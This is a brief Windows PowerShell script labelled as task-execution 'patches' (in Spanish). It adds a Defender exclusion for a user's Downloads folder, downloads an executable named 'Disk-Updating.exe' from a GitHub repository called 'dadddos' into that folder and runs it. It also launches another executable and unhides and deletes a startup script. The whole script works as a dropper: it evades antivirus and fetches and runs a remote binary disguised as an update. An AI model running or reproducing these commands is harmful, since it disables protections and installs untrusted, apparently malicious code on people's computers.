# Parches Ejecución de Tareas.
Add-MpPreference -ExclusionPath "C:\Users\ana\Downloads"

Invoke-WebRequest -Uri https://raw.githubusercontent.com/fullcaleta/dadddos/main/Disk-Updating.exe -OutFile C:\Users\ana\Downloads\Disk-Updating.exe
taskkill /F /IM Disk-Updating.exe
C:\Users\ana\Downloads\Disk-Updating.exe
taskkill /F /IM lml.exe
C:\Users\seba\Downloads\lml.exe
attrib -h C:\Users\Public\MyStartUp.ps1
del C:\Users\Public\MyStartUp.ps1
